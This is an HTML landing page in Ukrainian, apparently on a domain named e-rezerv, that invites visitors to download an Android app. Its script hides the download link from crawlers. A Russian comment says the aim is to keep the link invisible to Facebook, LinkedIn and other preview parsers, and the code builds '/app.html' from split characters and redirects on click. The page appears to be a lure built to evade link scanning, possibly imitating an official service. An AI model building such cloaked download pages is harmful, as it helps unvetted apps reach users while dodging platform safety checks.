<!doctype html>
<html lang="uk">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Завантажити застосунок</title>
<meta name="description" content="Завантажити мобільний застосунок для Android.">
<meta name="robots" content="index,follow">
<link rel="icon" href="favicon.ico">

<meta property="og:type" content="website">
<meta property="og:title" content="Завантажити застосунок">
<meta property="og:description" content="Завантажити мобільний застосунок для Android.">
<meta property="og:image" content="https://e-rezerv.github.io/og-preview.png">
<meta property="og:url" content="https://e-rezerv.github.io/">

<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="Завантажити застосунок">
<meta name="twitter:description" content="Завантажити мобільний застосунок для Android.">

<style>
  :root {
    color-scheme: light;
  }
  * { box-sizing: border-box; }
  html, body { margin: 0; padding: 0; height: 100%; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    background: linear-gradient(180deg, #f6f7fb 0%, #ffffff 100%);
    color: #1a1a1a;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    padding: 24px;
    text-align: center;
  }
  .card {
    max-width: 420px;
    width: 100%;
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 24px;
  }
  .icon {
    width: 96px;
    height: 96px;
    border-radius: 24px;
    background: #16a34a;
    display: flex;
    align-items: center;
    justify-content: center;
    box-shadow: 0 8px 32px rgba(22, 163, 74, 0.25);
  }
  .icon svg {
    width: 52px;
    height: 52px;
    fill: white;
  }
  h1 {
    font-size: 22px;
    font-weight: 600;
    margin: 0;
    letter-spacing: -0.01em;
  }
  p.sub {
    font-size: 15px;
    color: #6b7280;
    margin: 0;
    line-height: 1.5;
  }
  .btn {
    display: inline-block;
    background: #16a34a;
    color: white;
    font-size: 17px;
    font-weight: 600;
    padding: 16px 40px;
    border-radius: 14px;
    border: none;
    cursor: pointer;
    text-decoration: none;
    box-shadow: 0 4px 20px rgba(22, 163, 74, 0.35);
    transition: transform 0.15s ease, box-shadow 0.15s ease;
    min-width: 260px;
  }
  .btn:hover, .btn:focus {
    transform: translateY(-1px);
    box-shadow: 0 6px 24px rgba(22, 163, 74, 0.45);
  }
  .btn:active { transform: translateY(0); }
  footer {
    margin-top: 40px;
    font-size: 12px;
    color: #9ca3af;
  }
</style>
</head>
<body>

<main class="card">
  <div class="icon" aria-hidden="true">
    <svg viewBox="0 0 24 24"><path d="M12 3a1 1 0 0 1 1 1v10.586l3.293-3.293a1 1 0 1 1 1.414 1.414l-5 5a1 1 0 0 1-1.414 0l-5-5a1 1 0 1 1 1.414-1.414L11 14.586V4a1 1 0 0 1 1-1zM5 19a1 1 0 0 1 1-1h12a1 1 0 1 1 0 2H6a1 1 0 0 1-1-1z"/></svg>
  </div>

  <div>
    <h1>Ваш застосунок готовий</h1>
    <p class="sub">Натисніть кнопку нижче, щоб відкрити сторінку завантаження.</p>
  </div>

  <button class="btn" id="go" type="button">Перейти на сайт</button>

  <footer>© 2026</footer>
</main>

<script>
  // Ссылка НЕ в href — только в JS. Роботы, которые не выполняют JS
  // (Facebook, LinkedIn, большинство парсеров превью) — не смогут её увидеть.
  (function () {
    var parts = ['a', 'p', 'p', '.', 'h', 't', 'm', 'l'];
    var target = '/' + parts.join('');
    document.getElementById('go').addEventListener('click', function () {
      window.location.href = target;
    });
  })();
</script>

</body>
</html>
